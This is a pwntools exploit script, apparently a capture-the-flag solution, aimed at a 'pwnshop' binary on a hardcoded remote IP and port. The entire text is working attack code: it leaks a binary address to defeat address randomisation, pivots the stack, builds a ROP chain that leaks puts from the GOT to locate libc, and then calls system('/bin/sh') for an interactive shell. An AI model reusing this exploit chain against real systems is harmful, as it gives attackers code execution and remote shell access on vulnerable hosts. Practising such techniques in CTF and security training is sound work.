from pwn import *

exe = './pwnshop'

context.binary = exe

TIMEOUT = 0.5

# p = process(exe)
# libc = ELF('./libc.self')

p = remote('206.189.121.131', 31238)
libc = ELF('./libc.target')

elf = ELF(exe)

OFFSET_LEAK_FROM_BASE = 0x40c0

def put_back_prompt(data):
    lines = data.split(b'\n')
    last = lines[-1]
    if last == b'> ':
        p.unrecv(last)

def fix_prompt():
    data = p.recv(timeout=TIMEOUT)
    put_back_prompt(data)

def leak_binary_address():
    p.sendlineafter('> ', '2')
    p.sendlineafter('? ', 'asdf')
    p.sendlineafter('? ', '11111111')
    result = p.recv(timeout=TIMEOUT)
    leak = result.split(b'? The best I can')[0].split(b'11111111')[1]
    put_back_prompt(result)
    return int.from_bytes(leak, 'little') 


bin_leak = leak_binary_address()
elf.address = bin_leak - OFFSET_LEAK_FROM_BASE
log.info(f"Got binary base {hex(elf.address)}")

POP_RDI = elf.address + 0x00000000000013c3 # pop rdi ; ret
SUB_RSP_28 = elf.address + 0x0000000000001219 # sub rsp, 0x28 ; ret
MAIN_FUNC = elf.address + 0x000010a0

def exploit_chain(ropchain):
    rop_index = 40
    prep = {72: SUB_RSP_28}
    for addr in ropchain:
        if rop_index == 72: raise Exception('ROPChain too long')
        prep[rop_index] = addr
        rop_index += 8
    return flat(prep, length=80)

def exploit(ropchain):
    payload = exploit_chain(ropchain)
    p.sendline('') # please try again
    fix_prompt()
    p.sendlineafter('> ', '1')
    p.sendlineafter(': ', payload)
    result = p.recv(timeout=TIMEOUT)
    return result

def leak_got(func):
    leak_recv = exploit([POP_RDI, elf.got[func], elf.plt['puts'], MAIN_FUNC])
    l = leak_recv.split(b'\n========= ')[0]
    put_back_prompt(leak_recv)
    addr = int.from_bytes(l, 'little')
    log.info(f"Leak: {func} @ {hex(addr)}")
    return addr

GOT_PUTS = leak_got('puts')
libc.address = GOT_PUTS - libc.sym['puts']

# leak_got('read')

BIN_SH = next(libc.search(b'/bin/sh\x00'))
exploit([POP_RDI, BIN_SH, libc.sym['system'], MAIN_FUNC])

p.interactive()